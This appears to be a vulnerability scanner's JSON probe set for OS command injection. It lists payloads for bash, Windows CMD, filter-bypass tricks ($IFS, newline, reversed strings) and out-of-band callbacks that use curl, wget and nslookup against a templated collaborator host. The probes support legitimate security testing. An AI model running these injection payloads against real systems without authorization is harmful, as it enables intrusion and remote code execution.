{
  "category": "command_injection",
  "contexts": {
    "bash": {
      "description": "OS command injection probes targeting Linux/Unix shell execution via common web stacks",
      "tech_match": ["Apache", "Nginx", "PHP", "Flask", "Python"],
      "param_match": ["cmd", "exec", "command", "ping", "ip", "host", "url", "dir", "path"],
      "probes": [
        {
          "payload": "{{baseline}}; echo {{marker}}",
          "description": "Semicolon command separator injection — marker in response confirms execution",
          "matchers": [
            {"type": "reflection", "check_variants": true}
          ],
          "severity": "critical",
          "confidence_boost": 80,
          "variables": {}
        },
        {
          "payload": "{{baseline}}| echo {{marker}}",
          "description": "Pipe command injection — marker in response confirms execution",
          "matchers": [
            {"type": "reflection", "check_variants": true}
          ],
          "severity": "critical",
          "confidence_boost": 80,
          "variables": {}
        },
        {
          "payload": "{{baseline}}$(echo {{marker}})",
          "description": "Command substitution injection — marker in response confirms execution",
          "matchers": [
            {"type": "reflection", "check_variants": true}
          ],
          "severity": "critical",
          "confidence_boost": 80,
          "variables": {}
        },
        {
          "payload": "{{baseline}}; sleep {{sleep}}",
          "description": "Time-based blind command injection via sleep",
          "matchers": [
            {"type": "timing", "min_ms": 4000}
          ],
          "severity": "high",
          "confidence_boost": 70,
          "variables": {}
        },
        {
          "payload": "{{baseline}}`echo {{marker}}`",
          "description": "Backtick command substitution injection",
          "matchers": [
            {"type": "reflection", "check_variants": true}
          ],
          "severity": "critical",
          "confidence_boost": 75,
          "variables": {}
        },
        {
          "payload": "{{baseline}} && echo {{marker}}",
          "description": "AND operator command injection — executes only if baseline succeeds",
          "matchers": [
            {"type": "reflection", "check_variants": true}
          ],
          "severity": "critical",
          "confidence_boost": 75,
          "variables": {}
        }
      ]
    },
    "windows_cmd": {
      "description": "OS command injection probes targeting Windows CMD via IIS/ASP.NET",
      "tech_match": ["IIS", "ASP.NET"],
      "param_match": ["cmd", "exec", "command", "ping", "ip", "host", "url", "dir", "path"],
      "probes": [
        {
          "payload": "{{baseline}}& echo {{marker}}",
          "description": "Windows CMD ampersand command separator injection",
          "matchers": [
            {"type": "reflection", "check_variants": true}
          ],
          "severity": "critical",
          "confidence_boost": 80,
          "variables": {}
        },
        {
          "payload": "{{baseline}}| echo {{marker}}",
          "description": "Windows CMD pipe injection",
          "matchers": [
            {"type": "reflection", "check_variants": true}
          ],
          "severity": "critical",
          "confidence_boost": 80,
          "variables": {}
        },
        {
          "payload": "{{baseline}}& ping -n {{sleep}} 127.0.0.1",
          "description": "Windows CMD time-based blind injection via ping delay",
          "matchers": [
            {"type": "timing", "min_ms": 4000}
          ],
          "severity": "high",
          "confidence_boost": 65,
          "variables": {}
        }
      ]
    },
    "blind_oob": {
      "description": "Out-of-band blind command injection — uses curl/wget/nslookup to trigger DNS or HTTP callbacks to Burp Collaborator",
      "tech_match": ["Apache", "Nginx", "PHP", "Flask", "Python"],
      "param_match": ["cmd", "exec", "command", "ping", "ip", "host", "url", "dir", "path"],
      "probes": [
        {
          "payload": "{{baseline}}; curl http://{{callback}}",
          "description": "OOB command injection via curl — HTTP interaction on collaborator confirms blind RCE",
          "matchers": [
            {"type": "length_diff", "min_diff": 0}
          ],
          "severity": "critical",
          "confidence_boost": 85,
          "variables": {}
        },
        {
          "payload": "{{baseline}}; nslookup {{callback}}",
          "description": "OOB command injection via nslookup — DNS interaction on collaborator confirms blind RCE",
          "matchers": [
            {"type": "length_diff", "min_diff": 0}
          ],
          "severity": "critical",
          "confidence_boost": 85,
          "variables": {}
        },
        {
          "payload": "{{baseline}}| wget http://{{callback}}/ci_test",
          "description": "OOB command injection via wget — HTTP GET to collaborator with unique path confirms blind RCE",
          "matchers": [
            {"type": "length_diff", "min_diff": 0}
          ],
          "severity": "critical",
          "confidence_boost": 85,
          "variables": {}
        }
      ]
    },
    "filter_bypass": {
      "description": "Filter bypass command injection from PayloadsAllTheThings — IFS, brace expansion, substitution, newline, and reverse string tricks",
      "tech_match": ["Apache", "Nginx", "PHP", "Flask", "Python"],
      "param_match": ["cmd", "exec", "command", "ping", "ip", "host", "url", "dir", "path"],
      "probes": [
        {
          "payload": "{{baseline}}$IFS$9id",
          "description": "IFS (Internal Field Separator) bypass for space filtering — $IFS acts as whitespace substitute",
          "matchers": [
            {"type": "word", "words": ["uid="], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 75,
          "variables": {}
        },
        {
          "payload": "{{baseline}};{id}",
          "description": "Brace expansion command injection — some shells execute {id} as a command group",
          "matchers": [
            {"type": "word", "words": ["uid="], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 70,
          "variables": {}
        },
        {
          "payload": "{{baseline}}$(id)",
          "description": "Command substitution injection (dollar-paren form) — output replaces the substitution inline",
          "matchers": [
            {"type": "word", "words": ["uid="], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 75,
          "variables": {}
        },
        {
          "payload": "{{baseline}}`id`",
          "description": "Backtick command substitution — legacy form, still evaluated in many shells",
          "matchers": [
            {"type": "word", "words": ["uid="], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 75,
          "variables": {}
        },
        {
          "payload": "{{baseline}}%0aid",
          "description": "Newline (URL-encoded %0a) as command separator — bypasses filters checking for ; | & characters only",
          "matchers": [
            {"type": "word", "words": ["uid="], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 70,
          "variables": {}
        },
        {
          "payload": "{{baseline}}|rev<<<'di'",
          "description": "Reverse string trick — 'di' reversed is 'id'; bypasses filters matching literal command names",
          "matchers": [
            {"type": "word", "words": ["uid="], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 65,
          "variables": {}
        }
      ]
    }
  }
}
